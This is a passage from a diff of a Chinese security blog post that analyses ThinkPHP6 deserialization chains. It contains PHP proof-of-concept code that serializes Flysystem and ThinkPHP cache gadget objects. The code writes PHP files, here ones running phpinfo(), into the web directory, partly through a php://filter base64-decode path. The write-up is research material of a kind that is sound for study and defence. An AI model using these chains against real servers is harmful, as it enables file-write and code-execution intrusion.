class_">use</span> <span class="title class_">League</span>\<span class="title class_">Flysystem</span>\<span class="title class_">Cached</span>\<span class="title class_">Storage</span>\<span class="title class_">AbstractCache</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">CacheStore</span> <span class="keyword">extends</span> <span class="title">AbstractCache</span> </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$key</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$store</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$store</span>=<span class="string">&quot;&quot;</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;store = <span class="variable">$store</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span> &#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Driver</span> &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">options</span> = [&quot;<span class="title class_">serialize</span>&quot;=&gt;[&quot;<span class="title class_">trim</span>&quot;],&quot;<span class="title class_">expire</span>&quot;=&gt;1,&quot;<span class="title class_">prefix</span>&quot;=&gt;<span class="title class_">false</span>,&quot;<span class="title class_">hash_type</span>&quot;=&gt;&quot;<span class="title class_">md5</span>&quot;,&quot;<span class="title class_">cache_subdir</span>&quot;=&gt;<span class="title class_">false</span>,&quot;<span class="title class_">path</span>&quot;=&gt;&quot;<span class="title class_">php</span>://<span class="title class_">filter</span>/<span class="title class_">write</span>=<span class="title class_">convert</span>.<span class="title class_">base64</span>-<span class="title class_">decode</span>/<span class="title class_">resource</span>=../&quot;,&quot;<span class="title class_">data_compress</span>&quot;=&gt;0];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">Driver</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">File</span> <span class="keyword">extends</span> <span class="title">Driver</span></span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">file</span> = <span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span>\<span class="title class_">File</span>();</span><br><span class="line">    <span class="variable">$cache</span> = <span class="keyword">new</span> think\filesystem\<span class="title function_ invoke__">CacheStore</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$cache</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
 
+namespace League\Flysystem\Cached\Storage &#123;
+    abstract class AbstractCache &#123;
+        protected $autosave = false;
+        protected $complete = &quot;uuuPD9waHAgcGhwaW5mbygpOw==&quot;;
+    &#125;
+&#125;
+
+namespace think\filesystem &#123;
+    use League\Flysystem\Cached\Storage\AbstractCache;
+    class CacheStore extends AbstractCache &#123;
+        protected $key = &quot;1&quot;;
+        protected $store;
+        public function __construct($store=&quot;&quot;) &#123;
+            $this-&gt;store = $store;
+        &#125;
+    &#125;
+&#125;
+
+namespace think\cache &#123;
+    abstract class Driver &#123;
+        protected $options = [&quot;serialize&quot;=&gt;[&quot;trim&quot;],&quot;expire&quot;=&gt;1,&quot;prefix&quot;=&gt;false,&quot;hash_type&quot;=&gt;&quot;md5&quot;,&quot;cache_subdir&quot;=&gt;false,&quot;path&quot;=&gt;&quot;php://filter/write=convert.base64-decode/resource=../&quot;,&quot;data_compress&quot;=&gt;0];
+    &#125;
+&#125;
+
+namespace think\cache\driver &#123;
+    use think\cache\Driver;
+    class File extends Driver&#123;&#125;
+&#125;
+
+namespace &#123;
+    $file = new think\cache\driver\File();
+    $cache = new think\filesystem\CacheStore($file);
+    echo urlencode(serialize($cache));
+&#125;
+?&gt;
+</code></pre>
 <p><img src="/../images/image-20240710123707632.png" alt="image-20240710123707632"></p>
 <h2 id="利用链3"><a href="#利用链3" class="headerlink" title="利用链3"></a>利用链3</h2><p>链子的起点和上一条链子一样，但是这里选择跟进vendor\league\flysystem-cached-adapter\src\Storage\Adapter.php的save方法</p>
 <p>$contents来自$this-&gt;getForStorage()，后面处理也和上一条链子一样</p>
@@ -301,59 +289,101 @@
 <p>再看write方法，$location为经过applyPathPrefix方法处理的路径，$contents是经过json_encode处理后的json数据</p>
 <p><img src="/../images/image-20240710143805789.png" alt="image-20240710143805789"></p>
 <p><img src="/../images/image-20240710143722191.png" alt="image-20240710143722191"></p>
-<h3 id="PoC-1"><a href="#PoC-1" class="headerlink" title="PoC"></a>PoC</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">League</span>\<span class="title class_">Flysystem</span>\<span class="title class_">Cached</span>\<span class="title class_">Storage</span> &#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">AbstractCache</span> &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">autosave</span> = <span class="title class_">false</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$cache</span> = [<span class="string">&quot;p0l1st&quot;</span> =&gt; <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">League</span>\<span class="title class_">Flysystem</span>\<span class="title class_">Cached</span>\<span class="title class_">Storage</span> &#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">League</span>\<span class="title class_">Flysystem</span>\<span class="title class_">Cached</span>\<span class="title class_">Storage</span>\<span class="title class_">AbstractCache</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Adapter</span> <span class="keyword">extends</span> <span class="title">AbstractCache</span> </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$adapter</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$adapter</span> = <span class="string">&quot;&quot;</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&quot;../ppppp.php&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;adapter = <span class="variable">$adapter</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">League</span>\<span class="title class_">Flysystem</span>\<span class="title class_">Adapter</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Local</span> &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">writeFlags</span> = 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">local</span> = <span class="title class_">new</span> <span class="title class_">League</span>\<span class="title class_">Flysystem</span>\<span class="title class_">Adapter</span>\<span class="title class_">Local</span>();</span><br><span class="line">    <span class="variable">$cache</span> = <span class="keyword">new</span> <span class="title class_">League\Flysystem\Cached\Storage\Adapter</span>(<span class="variable">$local</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$cache</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="PoC-1"><a href="#PoC-1" class="headerlink" title="PoC"></a>PoC</h3><pre><code class="php">&lt;?php
 
+namespace League\Flysystem\Cached\Storage &#123;
+    abstract class AbstractCache &#123;
+        protected $autosave = false;
+        protected $cache = [&quot;p0l1st&quot; =&gt; &quot;&lt;?php phpinfo();?&gt;&quot;];
+    &#125;
+&#125;
+
+namespace League\Flysystem\Cached\Storage &#123;
+    use League\Flysystem\Cached\Storage\AbstractCache;
+    class Adapter extends AbstractCache &#123;
+        protected $file;
+        protected $adapter;
+        public function __construct($adapter = &quot;&quot;) &#123;
+            $this-&gt;file = &quot;../ppppp.php&quot;;
+            $this-&gt;adapter = $adapter;
+        &#125;
+    &#125;
+&#125;
+
+namespace League\Flysystem\Adapter &#123;
+    class Local &#123;
+        protected $writeFlags = 0;
+    &#125;
+&#125;
+
+namespace &#123;
+    $local = new League\Flysystem\Adapter\Local();
+    $cache = new League\Flysystem\Cached\Storage\Adapter($local);
+    echo urlencode(serialize($cache));
+&#125;
+?&gt;
+</code></pre>
 <p><img src="/../images/image-20240710144420032.png" alt="image-20240710144420032"></p>
 
-        </div>
+    </div>
+</article>
 
-        
-            <section class="post-copyright">
-                
-                
-                
-                
-
-            </section>
-        
-        <section class="post-tags">
-            <div>
-                <span>Tag(s):</span>
-                <span class="tag">
-                    
-                    
-                        <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"># 代码审计</a>
-                    
-                        
-                </span>
-            </div>
-            <div>
-                <a href="javascript:window.history.back();">back</a>
-                <span>· </span>
-                <a href="/">home</a>
-            </div>
-        </section>
-        <section class="post-nav">
-            
-                <a class="prev" rel="prev" href="/2024/07/10/ThinkPHP6-0-13%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2022-38352-%E5%88%86%E6%9E%90/">ThinkPHP6.0.13反序列化(CVE-2022-38352)分析</a>
-            
-            
-            <a class="next" rel="next" href="/2024/07/09/ThinkPHP6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/">ThinkPHP6代码审计:任意文件写入</a>
-            
-        </section>
-
-
-    </article>
+<div id="paginator">
+    
 </div>
 
-            </div>
-            <footer id="footer" class="footer">
-    <div class="copyright">
-        <span>© p0l1st | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
     </div>
-</footer>
+</div>
 
+<div id="bottom-outer">
+    <div id="bottom-inner">
+        2019-2024 p0l1st 皖ICP备16011445号
     </div>
+</div>
+
+<div id="to-top">
+    <i class="iconfont icon-up"></i>
+</div>
+
+
+    
+        <script src="http://example.com/js/jquery-3.4.1.min.js"></script>
+    
+        <script src="http://example.com/js/highlight-9.13.1.min.js"></script>
+    
+        <script src="http://example.com/js/transition.js"></script>
+    
+        <script src="http://example.com/js/smooth-scroll.min.js"></script>
+    
+
+
+
+    <script>
+      $(function () {
+        $('#banner-outer').addClass('fade-out')
+        $('#menu-outer').addClass('fade-show')
+
+        $('pre').each(function (i, block) {
+          hljs.highlightBlock(block);
+        });
+      })
+    </script>
+
+
+<script>
+  $(function () {
+    $(window).scroll(function () {
+      if ($(window).scrollTop() > 150) {
+        $("#to-top").fadeIn();
+      } else {
+        $("#to-top").fadeOut();
+      }
+    });
+    $("#to-top").click(function () {
+      $("body,html").animate({scrollTop: 0}, 500);
+      return false;
+    })
+  })
+</script>
 </body>
-
 </html>
